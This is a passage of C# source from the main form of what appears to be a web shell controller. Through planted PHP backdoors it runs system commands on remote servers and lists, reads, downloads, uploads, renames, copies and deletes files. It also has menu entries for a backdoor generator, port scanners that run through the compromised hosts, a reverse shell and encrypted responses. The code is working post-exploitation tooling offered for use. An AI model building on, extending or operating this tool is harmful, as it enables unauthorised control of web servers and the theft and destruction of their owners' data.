                btnFileBrowserGo_Click(sender, e);

                e.Handled = true;
                e.SuppressKeyPress = true;
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void textBoxMaxCommentLength_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar)) {
                e.Handled = true;
            }
        }

        /// <summary>
        /// Scrolls to the end of the Console Output Richtext box on update
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void richTextBoxConsoleOutput_TextChanged(object sender, EventArgs e)
        {
            richTextBoxConsoleOutput.SelectionStart = richTextBoxConsoleOutput.Text.Length;
            richTextBoxConsoleOutput.ScrollToCaret();
        }

        /// <summary>
        /// Copys the full shell url to the clipboard
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void copyShellURLToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(SelectedShellUrl);
        }

        /// <summary>
        /// Runs the console command input into the textbox
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void btnConsoleGoClick_Click(object sender, EventArgs e)
        {
            if (ValidTarget() == false) {
                return;
            }

            if (string.IsNullOrEmpty(textBoxConsoleInput.Text)) {
                return;
            }

            btnConsoleGoClick.Enabled = false;

            string cmd = textBoxConsoleInput.Text;
            textBoxConsoleInput.Text = string.Empty;

            string shellUrl = SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

            string phpCode = PhpBuilder.ExecuteSystemCode(cmd, encryptResponse);
            string result = await ExecutePHPCode(shellUrl, phpCode, encryptResponse, ResponseEncryptionMode);

            if (string.IsNullOrEmpty(result) == false) {
                richTextBoxConsoleOutput.Text += "$ " + cmd + "\r\n" + result + "\r\n";
            } else {
                richTextBoxConsoleOutput.Text += "$ " + cmd + "\r\nNo Data Returned\r\n";
            }

            consoleTextboxAutoComplete.Add(cmd);
            btnConsoleGoClick.Enabled = true;
        }

        /// <summary>
        /// Retests the ping of the selected shell
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void testConnectionToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ValidTarget() == false) {
                return;
            }

            string shellUrl = SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

            ListViewItem lvi = GuiHelper.GetFirstSelectedListview(listViewShells);

            if (lvi != null
            && (Shells[shellUrl].PingStopwatch == null
            || Shells[shellUrl].PingStopwatch.IsRunning == false)) {

                Shells[shellUrl].PingStopwatch = new Stopwatch();
                Shells[shellUrl].PingStopwatch.Start();

                string phpCode = PhpBuilder.PhpTestExecutionWithEcho1(encryptResponse);
                string result = await ExecutePHPCode(shellUrl, phpCode, encryptResponse, ResponseEncryptionMode);

                if (string.IsNullOrEmpty(result)) {
                    return;
                }

                lvi.SubItems[1].Text = Shells[shellUrl].PingStopwatch.ElapsedMilliseconds.ToString() + " ms";
                Shells[shellUrl].PingStopwatch.Stop();
            }
        }

        /// <summary>
        /// Opens the modify shell dialog with existing shell/connection data
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void editToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(SelectedShellUrl) == false) {
                string shellUrl = SelectedShellUrl;
                string varName = Shells[shellUrl].RequestArgName;
                string varType = (Shells[shellUrl].SendDataViaCookie ? "cookie" : "post");

                ModifyShell updateHostForm = new ModifyShell(shellUrl, varName, varType);
                updateHostForm.Show();
            }
        }

        /// <summary>
        /// Opens the backdoor generator dialog
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void backdoorGeneratorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            BackdoorGenerator backdoorGenerator = new BackdoorGenerator();
            backdoorGenerator.Show();
        }

        /// <summary>
        /// Opens the proxy settings dialog
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void proxySettingsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ProxyOptions proxyOptions = ProxyOptions.getInstance();
            proxyOptions.ShowDialog();
        }

        /// <summary>
        /// Opens the Shell setting modification dialog
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void addToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ModifyShell addClientForm = new ModifyShell();
            addClientForm.Show();
        }

        /// <summary>
        /// Opens the portscanner dialog
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void portScannerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            PortScanner ps = new PortScanner(SelectedShellUrl);
            ps.ShowDialog();
        }

        /// <summary>
        /// Opens the distributed port scanner dialog
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void portScannerToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (listViewShells.Items.Count <= 0) {
                return;
            }

            DistributedPortScanner ds = new DistributedPortScanner();
            ds.ShowDialog();
        }

        /// <summary>
        /// Opens the reverse shell dialog
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripMenuItemReverseShell_Click(object sender, EventArgs e)
        {
            ReverseShell reverseShellForm = new ReverseShell(SelectedShellUrl);
            reverseShellForm.ShowDialog();
        }

        /// <summary>
        /// Opens the options dialog
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void optionsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Options optionsForm = new Options();
            optionsForm.ShowDialog();
        }

        #endregion

        #region FILE_BROWSER_EVENTS

        /// <summary>
        /// Triggers the goback event in the file browser to navigate back a directory
        /// </summary>
        private async void btnFileBrowserBack_MouseClick(object sender, EventArgs e)
        {
            FilebrowserGoBack();
        }

        /// <summary>
        /// Upload File routine within filebrowser
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void btnUpload_Click(object sender, EventArgs e)
        {
            if (ValidTarget() == false) {
                return;
            }

            if (string.IsNullOrEmpty(txtBoxFileBrowserPath.Text)) {
                return;
            }

            string shellUrl = SelectedShellUrl;

            //windows does not currently support uploading
            if (Shells[shellUrl].IsWindows) {
                return;
            }

            UploadFile u = new UploadFile(shellUrl, txtBoxFileBrowserPath.Text);
            u.ShowDialog();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void btnFileBrowserGo_Click(object sender, EventArgs e)
        {
            if (btnFileBrowserGo.Enabled == false) {
                return;
            }

            btnFileBrowserGo.Enabled = false;

            if (ValidTarget() == false) {
                return;
            }

            if (string.IsNullOrEmpty(txtBoxFileBrowserPath.Text)) {
                return;
            }

            string shellUrl = SelectedShellUrl;
            string phpVersion = Shells[shellUrl].PHP_VERSION;
            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

            //windows does not currently support direct path operations
            if (Shells[shellUrl].IsWindows) {
                return;
            }

            string phpCode = PhpBuilder.DirectoryEnumerationCode(txtBoxFileBrowserPath.Text, phpVersion, encryptResponse);
            string result = await ExecutePHPCode(shellUrl, phpCode, encryptResponse, ResponseEncryptionMode);

            Shells[shellUrl].Files.Nodes.Clear();

            //if user didn't switch targets by the time this callback is triggered clear the live treeview
            if (SelectedShellUrl == shellUrl) {
                treeViewFileBrowser.Nodes.Clear();
                treeViewFileBrowser.Refresh();
            }

            if (string.IsNullOrEmpty(result) == false) {
                FileBrowserRender(result, shellUrl);
            }
            btnFileBrowserGo.Enabled = true;
        }

        /// <summary>
        /// Main Filebrowser render / view update routine, triggered when change directories, on refresh
        /// </summary>
        /// <param name="result"></param>
        /// <param name="shellUrl"></param>
        private async Task FileBrowserRender(string result, string shellUrl, System.Windows.Forms.TreeNode baseTn = null)
        {
            if (shellUrl != SelectedShellUrl) {
                LogHelper.AddShellLog(SelectedShellUrl + "/" + shellUrl, "Detected shell change before filebrowser rendered.", LogHelper.LOG_LEVEL.WARNING);
                return;
            }

            string[] rows = result.Split(new[] { PhpBuilder.responseDataRowSeperator }, StringSplitOptions.None);

            if (rows != null && rows.Length > 0) {
                if (rows.Length > 1500) {
                    LogHelper.AddGlobalLog("Too many files in directory to render, use reverse shell.", shellUrl, LogHelper.LOG_LEVEL.ERROR);
                    return;
                }

                treeViewFileBrowser.BeginUpdate();
                foreach (string row in rows) {
                    string[] columns = row.Split(new[] { PhpBuilder.responseDataSeperator }, StringSplitOptions.None);

                    //todo clean up len check
                    if (columns != null && columns.Length - 2 > 0) {
                        string permissionOctal = Convert.ToString(Convert.ToInt32(columns[4]), 8);
                        string perms = permissionOctal.Substring(permissionOctal.Length - 4);

                        System.Windows.Forms.TreeNodeCollection tnCollection;

                        if (baseTn != null && baseTn.Nodes != null) {
                            tnCollection = baseTn.Nodes;
                        } else {
                            tnCollection = treeViewFileBrowser.Nodes;
                        }

                        //todo cleanup index's and image indexs 
                        if (columns[columns.Length - 2] == "dir") {
                            System.Windows.Forms.TreeNode lastTn = tnCollection.Add("dir", columns[0], 0);
                            lastTn.ToolTipText = perms;
                        } else {
                            System.Windows.Forms.TreeNode lastTn = tnCollection.Add("file", columns[0], 1);
                            if (string.IsNullOrEmpty(columns[2]) == false) {
                                lastTn.ToolTipText = perms + " - " + Helper.FormatBytes(Convert.ToDouble(columns[2]));
                            } else {
                                lastTn.ToolTipText = perms;
                            }
                        }
                    }
                }
                treeViewFileBrowser.Sort();
                treeViewFileBrowser.EndUpdate();

                if (baseTn != null) {
                    baseTn.Expand();
                }
            }
        }

        /// <summary>
        /// Filebrowser startup routine, fired on first showing or filebrowser refresh
        /// </summary>
        private async Task StartFileBrowser()
        {
            if (ValidTarget() == false) {
                return;
            }

            string shellUrl = SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

            txtBoxFileBrowserPath.Text = Shells[shellUrl].Cwd;

            if (Shells[shellUrl].IsWindows) {
                txtBoxFileBrowserPath.Text = string.Empty;

                string phpCode = PhpBuilder.GetHardDriveLettersPhp(encryptResponse);
                string result = await ExecutePHPCode(shellUrl, phpCode, encryptResponse, ResponseEncryptionMode);

                if (string.IsNullOrEmpty(result) == false) {
                    string[] drives = result.Split(new[] { "|" }, StringSplitOptions.RemoveEmptyEntries);

                    if (drives != null && drives.Length > 0) {
                        treeViewFileBrowser.Nodes.Clear();
                        foreach (string drive in drives) {
                            treeViewFileBrowser.Nodes.Add("drive", drive, 2);
                        }
                    }
                }
            } else {
                string phpVersion = Shells[shellUrl].PHP_VERSION;
                string phpCode = PhpBuilder.DirectoryEnumerationCode(".", phpVersion, encryptResponse);
                string result = await ExecutePHPCode(shellUrl, phpCode, encryptResponse, ResponseEncryptionMode);

                if (!string.IsNullOrEmpty(result)) {
                    FileBrowserRender(result, shellUrl);
                }
            }
            tabControlMain.SelectedTab = tabPageFiles;
        }

        /// <summary>
        /// 
        /// </summary>
        private async Task FilebrowserGoBack()
        {
            if (ValidTarget() == false) {
                return;
            }

            string shellUrl = SelectedShellUrl;
            ShellInfo shell = Shells[shellUrl];

            //windows does not currently support the back operation
            if (shell.IsWindows) {
                return;
            }

            bool encryptResponse = shell.ResponseEncryption;
            int ResponseEncryptionMode = shell.ResponseEncryptionMode;
            string phpVersion = shell.PHP_VERSION;

            string[] paths = txtBoxFileBrowserPath.Text.Split('/');
            string lastPathRemoved = string.Join("/", paths, 0, paths.Count() - 1);

            if (string.IsNullOrEmpty(lastPathRemoved)) {
                lastPathRemoved = "/";
            }

            string directoryContentsPHPCode = PhpBuilder.DirectoryEnumerationCode(lastPathRemoved, phpVersion, encryptResponse);
            string result = await ExecutePHPCode(shellUrl, directoryContentsPHPCode, encryptResponse, ResponseEncryptionMode);

            Shells[shellUrl].Files.Nodes.Clear();

            if (SelectedShellUrl == shellUrl) {
                treeViewFileBrowser.Nodes.Clear();
                treeViewFileBrowser.Refresh();

                txtBoxFileBrowserPath.Text = lastPathRemoved;

                if (!string.IsNullOrEmpty(result)) {
                    FileBrowserRender(result, shellUrl);
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void fileBrowserTreeView_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if (ValidTarget() == false) {
                return;
            }

            string shellUrl = SelectedShellUrl;
            string phpVersion = Shells[shellUrl].PHP_VERSION;
            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

            System.Windows.Forms.TreeNode tn = treeViewFileBrowser.SelectedNode;

            if (tn != null && tn.Nodes.Count == 0) {
                string path = tn.FullPath.Replace('\\', '/');

                if (path.Contains("..")) {
                    FilebrowserGoBack();
                } else {
                    string fullPath = string.Empty;
                    if (Shells[shellUrl].IsWindows) {
                        fullPath = path;
                    } else {
                        fullPath = txtBoxFileBrowserPath.Text + "/" + path;
                    }

                    string directoryContentsPHPCode = PhpBuilder.DirectoryEnumerationCode(fullPath, phpVersion, encryptResponse);
                    string result = await ExecutePHPCode(shellUrl, directoryContentsPHPCode, encryptResponse, ResponseEncryptionMode);

                    if (string.IsNullOrEmpty(result) == false) {
                        FileBrowserRender(result, shellUrl, tn);
                    }
                }
            }
        }

        /// <summary>
        /// Override Prevents the filebrowser icon from being changed when selected
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
            treeViewFileBrowser.SelectedImageIndex = e.Node.ImageIndex;
        }

        /// <summary>
        /// Hard re-fresh the filebrowser and start over at the (root) directory.
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void btnFileBrowserRefresh_Click(object sender, EventArgs e)
        {
            if (ValidTarget() == false) {
                return;
            }

            if (treeViewFileBrowser.Nodes != null
             && treeViewFileBrowser.Nodes.Count > 0) {
                if (Shells[SelectedShellUrl].Files != null) {
                    Shells[SelectedShellUrl].Files.Nodes.Clear();
                }
                treeViewFileBrowser.Nodes.Clear();
                treeViewFileBrowser.Refresh();
            }
            StartFileBrowser();
        }

        /// <summary>
        /// Updates selected node on right click to ensure that we have the correct node selected whenever 
        /// we preform context menu stip events on the filebrowser
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void treeView1_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
        {
            if (e.Button == MouseButtons.Right && e.Node != null) {
                treeViewFileBrowser.SelectedNode = e.Node;
            }
        }

        /// <summary>
        /// Returns the selected name of the file from the filebrowser
        /// </summary>
        /// <returns></returns>
        private string fileBrowserGetFileName()
        {
            return treeViewFileBrowser.SelectedNode.FullPath.Replace('\\', '/');
        }

        /// <summary>
        /// Returns the full path and file name from the filebrowser
        /// </summary>
        /// <returns></returns>
        private string fileBrowserGetFileNameAndPath()
        {
            string fileName = treeViewFileBrowser.SelectedNode.FullPath.Replace('\\', '/');
            return txtBoxFileBrowserPath.Text.TrimEnd('/', '\\') + "/" + fileName;
        }

        /// <summary>
        //
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void readFileToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            string shellUrl = SelectedShellUrl;
            bool encrypt = Shells[shellUrl].ResponseEncryption;
            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

            string name = fileBrowserGetFileNameAndPath();
            string phpCode = PhpBuilder.ReadFileToBase64(name, encrypt);

            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, "Viewing File -" + name, encrypt, ResponseEncryptionMode, true);
        }

        /// <summary>
        /// Renames a file using the name input from the prompt
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void renameFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ValidTarget() == false) {
                return;
            }

            string shellUrl = SelectedShellUrl;
            string fileName = fileBrowserGetFileNameAndPath();

            string newFileName = GuiHelper.RenameFileDialog(fileName, "Renaming File");

            if (!string.IsNullOrEmpty(newFileName)) {
                string newFile = txtBoxFileBrowserPath.Text + '/' + newFileName;
                string phpCode = "@rename('" + fileName + "', '" + newFile + "');";

                await WebRequestHelper.ExecuteRemotePHP(shellUrl, phpCode).ConfigureAwait(false);
            }
        }

        /// <summary>
        /// Deletes a file after displaying a warning prompt
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void deleteFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ValidTarget() == false) {
                return;
            }

            string shellUrl = SelectedShellUrl;
            string path = fileBrowserGetFileNameAndPath();

            DialogResult dialogResult = MessageBox.Show("Are you sure you want to delete \r\n(" + path + ")",
                                                        "Delete File Operation",
                                                         MessageBoxButtons.YesNo);

            if (dialogResult == DialogResult.Yes) {
                string phpCode = "@unlink('" + path + "');";
                await WebRequestHelper.ExecuteRemotePHP(shellUrl, phpCode).ConfigureAwait(false);
            }
        }

        /// <summary>
        /// Creates a copy of the selected file using the name from the prompt
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void copyFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ValidTarget() == false) {
                return;
            }


            string shellUrl = SelectedShellUrl;
            string fileName = fileBrowserGetFileNameAndPath();
            string newFileName = GuiHelper.RenameFileDialog(fileName, "Copying File");

            if (!string.IsNullOrEmpty(newFileName)) {
                string phpCode = "@copy('" + fileName + "', '" + txtBoxFileBrowserPath.Text + "/" + newFileName + "');";
                await WebRequestHelper.ExecuteRemotePHP(shellUrl, phpCode).ConfigureAwait(false);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ValidTarget() == false) {
                return;
            }

            string shellUrl = SelectedShellUrl;
            string fileName = fileBrowserGetFileName();
            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

            SaveFileDialog downloadFileDialog = new SaveFileDialog {
                RestoreDirectory = true
            };

            if (downloadFileDialog.ShowDialog() == DialogResult.OK) {
                if (!string.IsNullOrEmpty(downloadFileDialog.FileName)) {
                    string phpCode = PhpBuilder.ReadFileToBase64(fileName, encryptResponse);
                    string result = await ExecutePHPCode(shellUrl, phpCode, encryptResponse, ResponseEncryptionMode).ConfigureAwait(false);
                    if (string.IsNullOrEmpty(result) == false) {
                        byte[] fileBytes = Helper.DecodeBase64(result);
                        File.WriteAllBytes(downloadFileDialog.FileName, fileBytes);
                    }
                }
            }
        }

        #endregion

    }
}
